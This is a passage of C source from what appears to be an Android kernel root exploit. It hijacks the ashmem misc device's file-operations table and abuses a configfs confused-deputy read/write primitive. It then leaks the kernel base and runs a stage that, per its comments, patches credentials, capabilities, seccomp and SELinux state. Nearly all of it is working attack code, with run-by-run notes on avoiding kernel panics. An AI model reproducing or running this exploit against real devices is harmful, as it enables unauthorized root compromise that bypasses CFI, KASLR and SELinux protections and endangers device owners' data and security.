   * deputy BEFORE any other kernel call.  misc_open already dereferenced
   * ->open and succeeded; now verify each slot the kernel will use.  A
   * garbage value here means the route landed on the wrong page (coincidence
   * payload) and the NEXT fops call will panic -- abort safely.
   *
   * The original fix52 used raw pread(fd, ..., base + FOPS_*_OFF) where the
   * offset is a kernel VA.  As a signed off_t that VA is negative, so the
   * syscall rejects it with -EINVAL *before* touching ->read; every read came
   * back rv=-1 and the "table garbage" branch fired unconditionally, refusing
   * further ops and leaving misc.fops hijacked -> the next ashmem open jumped
   * garbage and panicked.  Use configfs_read_once instead: it picks a positive
   * pos (ASHMEM_PREFIX_COUNT - len) and plants page = target - pos via
   * SET_NAME, which is exactly how post_verify below reads the table.  fix54's
   * k_hit==k_true gate already proved the payload page is the real captured
   * one, so fd's f_op (->read = configfs_read) is trustworthy here.
   */
  {
    uint64_t llseek = 0, ioctl = 0, open_slot = 0, release = 0;
    uintptr_t base = fake_fops;
    /*
     * delta=-1 payload page-view shift: the kernel reads *(payload+X) as
     * buf[X-1..X+6], so a target one byte past the intended slot makes the
     * read come back canonical.  Every other table read in this file goes
     * through fops_table_base() which is fake_fops+VOFF (=fake+1 on the
     * VOFF=1 harness) and carries the same compensation implicitly; this
     * dump addresses the bare table base, so it must add the +1 itself
     * (run9: uncompensated reads came back want<<8|prev-slot-tail and the
     * garbage gate tripped on a perfectly healthy table; run11 with a
     * blanket +1 inside cfgfs_read_ex double-shifted the fops_table_base()
     * verify reads instead).  Content writes (put_fake_fops_table) land
     * canonical in the userspace buf and need no shift.
     */
    pr_info("fix52 cfi open dump base=%016zx (cfgfs)\n", base);
    ssize_t r0 = configfs_read_once(fd, base + FOPS_LLSEEK_OFF + 1, &llseek, 8);
    ssize_t r1 = configfs_read_once(fd, base + FOPS_IOCTL_OFF + 1, &ioctl, 8);
    ssize_t r2 = configfs_read_once(fd, base + FOPS_OPEN_OFF + 1, &open_slot, 8);
    ssize_t r3 =
        configfs_read_once(fd, base + FOPS_RELEASE_OFF + 1, &release, 8);
    pr_info("fix52 table dump llseek=%016llx rv=%zd ioctl=%016llx rv=%zd "
            "open=%016llx rv=%zd release=%016llx rv=%zd\n",
            (unsigned long long)llseek, r0,
            (unsigned long long)ioctl, r1,
            (unsigned long long)open_slot, r2,
            (unsigned long long)release, r3);
    uint64_t want_ioctl = (uint64_t)text_addr(ASHMEM_IOCTL);
    uint64_t want_open = (uint64_t)text_addr(ASHMEM_OPEN);
    if (r1 != 8 || r2 != 8 || ioctl != want_ioctl || open_slot != want_open) {
      pr_warning("fix52 cfi table garbage at open (ioctl rv=%zd %016llx want %016llx; "
                 "open rv=%zd %016llx want %016llx); refusing further ops\n",
                 r1, (unsigned long long)ioctl, (unsigned long long)want_ioctl,
                 r2, (unsigned long long)open_slot, (unsigned long long)want_open);
      /*
       * Safety net (run8 lesson): the route already stored fake+VOFF into
       * misc.fops.  If we bail here the route-end restore does not run
       * (kaslr_done stays 0), the payload page dies with this process, and
       * the next third-party misc open dereferences freed memory -- the
       * Binder:3292_5 misc_open+0xc8 alignment abort.  Write the original
       * table back through this fd before leaving (its read slot is still
       * the working configfs deputy, so read+write both succeed here).
       */
      uint64_t orig_tbl = (uint64_t)canon_addr(ASHMEM_FOPS);
      uint64_t cur_fops = 0;
      if (configfs_read_once(fd, text_addr(ASHMEM_MISC_FOPS), &cur_fops, 8) ==
              8 &&
          cur_fops != orig_tbl) {
        ssize_t wr = configfs_write_once(fd, text_addr(ASHMEM_MISC_FOPS),
                                         &orig_tbl, 8);
        pr_warning("fix52 garbage restore misc.fops=%016llx -> %016llx wr=%zd\n",
                   (unsigned long long)cur_fops, (unsigned long long)orig_tbl,
                   wr);
      }
      cfi_last_step = 50;
      cfi_last_errno = 0;
      close(fd);
      return 0;
    }
    pr_info("fix52 cfi table ok\n");
  }

  ks_diag_fd("cfi open", fd);
  ks_diag_table("cfi open");

  if (g_fops_probe_fd < 0) {
    g_fops_probe_fd = fcntl(fd, F_DUPFD_CLOEXEC, 10);
    pr_info("fops guard probe fd=%d (dup of cfi fd=%d)\n", g_fops_probe_fd,
            fd);
  }

  uintptr_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
  uintptr_t want_fops = route_expected_fops();
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != want_fops) {
    fops_before = pre_fops;
    /*
     * fix44: if open succeeded (fd >= 0, fstat ok) and the cfgfs read
     * failed with ENOTTY, the route store ALREADY landed -- fd is now
     * served by the payload fops, which do not implement ASHMEM_SET_NAME,
     * so configfs_read_once (which uses SET_NAME internally) returns
     * ENOTTY before pread runs.  This is the SUCCESS case, not a miss.
     * Proceed to binwrite; the kprobe fallback below is for the true
     * miss (route store did not land, real ashmem fops still serve fd).
     */
    if (errno == ENOTTY && fd >= 0) {
      pr_info("cfi pre_fops ENOTTY after open=%d -> route landed, "
              "continuing to binwrite (misc=%016zx want=%016zx)\n",
              fd, misc_fops, want_fops);
      fops_guard_set_expect(want_fops);
      goto post_verify;
    }
    cfi_last_step = 4;
    cfi_last_errno = errno;
    pr_info("cfi pre_fops miss rb=%zd misc=%016zx got=%016llx want=%016zx "
            "fake=%016zx errno=%d\n",
            pre_rb, misc_fops, (unsigned long long)pre_fops, want_fops,
            fake_fops, errno);
    /* The cfgfs read goes through ASHMEM_SET_NAME; if the route store already
     * landed, fd is served by the payload fops and SET_NAME can fail with
     * ENOTTY before pread runs, hiding a successful store.  Probe misc.fops
     * directly through the kprobe fetch so the store result stays observable. */
    uint64_t misc_probe = 0;
    int mr = ks_fetch64(misc_fops, &misc_probe);
    pr_info("cfi pre_fops probe rv=%d misc=%016llx want=%016zx\n", mr,
            (unsigned long long)misc_probe, want_fops);
    /* fix45: VOFF experiment — if the probe sees the shifted value the
     * route really wrote, treat it as landed (content/pointer +1 theory). */
    if (mr > 0 && misc_probe == want_fops && fd >= 0) {
      pr_info("cfi pre_fops VOFF match via probe -> route landed\n");
      fops_guard_set_expect(want_fops);
      goto post_verify;
    }
    goto fail;
  }
  /* misc.fops == expected is now confirmed; the guard keeps it there. */
  pr_info("cfi pre_fops OK rb=%zd got=%016llx want=%016zx\n",
          pre_rb, (unsigned long long)pre_fops, want_fops);
  fops_guard_set_expect(want_fops);

post_verify:
  /*
   * Tier-0 content gate: the route store can land on a page that is NOT
   * our payload (the drain_capture oracle only proves "some order-3 page
   * was captured", ~1-8% coincidence).  Now that fd is served by the
   * payload fops (confirmed via ENOTTY or pre_fops match above), read
   * back the ioctl slot through the confused-deputy and reject a garbage
   * table before binwrite jumps through it.
   */
  {
    uint64_t tbl_io = 0, tbl_open = 0;
    ssize_t t1 = configfs_read_once(
        fd, fops_table_base() + FOPS_IOCTL_OFF, &tbl_io, sizeof(tbl_io));
    ssize_t t2 = configfs_read_once(
        fd, fops_table_base() + FOPS_OPEN_OFF, &tbl_open, sizeof(tbl_open));
    uint64_t want_io = (uint64_t)text_addr(ASHMEM_IOCTL);
    uint64_t want_open = (uint64_t)text_addr(ASHMEM_OPEN);
    pr_info("cfi table verify ioctl=%016llx want=%016llx open=%016llx "
            "want_open=%016llx rv=%zd/%zd\n",
            (unsigned long long)tbl_io, (unsigned long long)want_io,
            (unsigned long long)tbl_open, (unsigned long long)want_open,
            t1, t2);
    if (t1 != (ssize_t)sizeof(tbl_io) || t2 != (ssize_t)sizeof(tbl_open) ||
        tbl_io != want_io || tbl_open != want_open) {
      cfi_last_step = 34;
      cfi_last_errno = errno;
      pr_warning("cfi table dead or garbage; refusing binwrite "
                 "(content was not our payload)\n");
      goto fail;
    }
  }

  pr_info("cfi post_verify enter fd=%d\n", fd);

  /*
   * Tier-0: the configfs read primitive is now proven live -- pull the
   * exact physvirt_offset/vmemmap out of .data and replace whatever
   * infer-from-leak guessed.  ALWAYS run the exact measurement: the
   * !ks_layout_measured guard used to skip it because infer-from-leak
   * sets that flag, but the inferred la0 is only a 1GiB-grid guess and
   * pipe physrw converts physical addresses through it — a wrong la0
   * sends the physrw access to an unmapped kernel address and panics
   * (kernel_panic,fatal_exception on stock boot).  The exact values
   * overwrite the guess.
   */
  if (!ks_layout_measure_cfgfs(fd))
    pr_warning("cfgfs layout measure failed; pipe physrw keeps inferred "
               "la0\n");
  pr_info("cfi post_verify layout done kaslr_done=%d\n", kaslr_done);

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != route_expected_fops()) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    pr_info("cfi postwrite fops miss rb=%zd got=%016llx want=%016zx\n",
            rb, (unsigned long long)before, route_expected_fops());
    goto fail;
  }

  if (kaslr_done) {
    if (!refresh_fake_fops_text(fd)) {
      cfi_last_step = 9;
      cfi_last_errno = errno;
      goto fail;
    }
  } else {
    if (!restore_slide_boot_id(fd)) {
      cfi_last_step = 10;
      cfi_last_errno = errno;
      goto fail;
    }

    if (!leak_kernel_base(fd)) {
      cfi_last_step = 9;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  ks_diag_fd("cfi pre-install", fd);
  ks_diag_table("cfi pre-install");

  /*
   * Restore misc.fops BEFORE install: everything below (pipe prepare,
   * physrw gate, android root) talks through this fd whose f_op snapshot
   * survives the restore, so nothing needs the hijacked node any more.
   * Keeping misc.fops==fake_fops during the long install window is what
   * let a third-party root open crash on a clobbered pointer.
   */
  {
    uint64_t orig_early = canon_addr(ASHMEM_FOPS);
    /* chain9: a dead payload table makes this cfgfs write jump garbage
     * through fd instead of restoring; refuse before touching it and let
     * the fail path (which re-checks content) skip the cfgfs too. */
    uint64_t tbl_early = 0;
    int tr_early = ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF, &tbl_early);
    if (tr_early < 0 || tbl_early != (uint64_t)text_addr(ASHMEM_IOCTL)) {
      fops_guard_set_expect(0);
      pr_warning("cfi early restore payload table dead tbl=%llx rv=%d; "
                 "bail\n",
                 (unsigned long long)tbl_early, tr_early);
      goto fail;
    }
    /* Set expect first: while expect still says fake the guard would flip a
     * freshly restored orig pointer straight back to fake (observed as
     * spurious clobber #1/#2 flip-flops around the install window). */
    fops_guard_set_expect((uintptr_t)orig_early);
    ssize_t er = configfs_write_once(fd, misc_fops, &orig_early,
                                     sizeof(orig_early));
    uint64_t eback = 0;
    ssize_t erd = configfs_read_once(fd, misc_fops, &eback, sizeof(eback));
    if (er != (ssize_t)sizeof(orig_early) || erd != (ssize_t)sizeof(eback) ||
        eback != orig_early) {
      fops_before = eback;
      cfi_last_step = 12;
      cfi_last_errno = errno;
      pr_warning("cfi early restore failed wr=%zd rd=%zd got=%016llx "
                 "want=%016llx errno=%d\n",
                 er, erd, (unsigned long long)eback,
                 (unsigned long long)orig_early, errno);
      goto fail;
    }
    pr_info("cfi early restore misc.fops=%016llx before install\n",
            (unsigned long long)orig_early);
  }

  /* app-domain structural miss: cache gate can fail identically every round
   * (owned=0, sc pinned to mm_cachep; round8 burned 8 rounds x 24 waves then
   * died silently at round 9).  KS_PIPE_MAX_ATTEMPTS caps the retry loop for
   * such domains so the chain fails fast instead of exhausting the process;
   * shell domain keeps the default. */
  int pipe_max_attempts = PIPE_MAX_ATTEMPTS;
  {
    const char *ma = getenv("KS_PIPE_MAX_ATTEMPTS");
    if (ma && ma[0]) {
      long mav = strtol(ma, NULL, 0);
      if (mav > 0 && mav <= 64) {
        pipe_max_attempts = (int)mav;
      }
    }
  }

  for (int attempt = 0; attempt < pipe_max_attempts; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (atomic_load(&root_stage_dirty)) {
      /* round5 panic guard: the root stage wrote kernel memory (seccomp/
       * cred/caps/selinux) and then failed (root child SIGKILLed).  A fresh
       * attempt would re-run the whole root stage over the half-patched
       * state -- the second pass corrupted shared structures and panicked
       * the box (init release_task Oops -> Fatal exception).  Fail fast and
       * let the fail amplifier reboot into a clean boot instead. */
      pr_warning("root stage dirty after attempt=%d; refusing further "
                 "attempts on half-patched kernel state\n", attempt);
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  {
    /* chain9: with the payload table dead every cfgfs op below jumps
     * garbage through fd (pc=0x5 panic).  misc is already restored before
     * the install window; refuse to touch cfgfs, idle the guard (it would
     * otherwise read the dead table itself), and fail quietly. */
    uint64_t tbl_fail = 0;
    int tr_fail = ks_fetch64(fops_table_base() + FOPS_IOCTL_OFF, &tbl_fail);
    if (tr_fail < 0 || tbl_fail != (uint64_t)text_addr(ASHMEM_IOCTL)) {
      pr_warning("cfi fail path payload table dead tbl=%llx rv=%d; skip "
                 "cfgfs restore\n",
                 (unsigned long long)tbl_fail, tr_fail);
      fops_guard_set_expect(0);
      SYSCHK(close(fd));
      return 0;
    }
    /*
     * Always put misc.fops back, even when the failure happened before the
     * binwrite (dirty==0): a half-finished cfi stage may leave the route's
     * fake_fops store (or a clobber) behind, and a wrong misc.fops is what
     * third-party opens crash on.  Rewriting the original pointer is a
     * safe no-op when it already holds.
     */
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    /* Expect first so the guard converges with the restore instead of
     * flipping the restored pointer back to fake mid-transaction. */
    fops_guard_set_expect((uintptr_t)original_fops_fail);
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    if (dirty) {
      uint64_t null_owner_fail = 0;
      cfi_owner_ret = configfs_write_once(
          fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
    }
    /*
     * Failed run with a live payload table: the pipe primitive still works,
     * so clear waiter->pi_blocked_on now (root.c only does this on success).
     * Without it the waiter thread's exit walks the CVE's stale stack
     * rt_waiter and panics the kernel.
     */
    if (!atomic_load(&pi_cleanup_done) && atomic_load(&waiter_tid) > 0) {
      int fp_ok = ks_pi_cleanup(fd);
      pr_warning("cfi fail path pi_cleanup ok=%d waiter_tid=%d\n", fp_ok,
                 atomic_load(&waiter_tid));
      if (fp_ok) {
        atomic_store(&pi_cleanup_done, 1);
      }
    }
  }
  SYSCHK(close(fd));
  return 0;
}
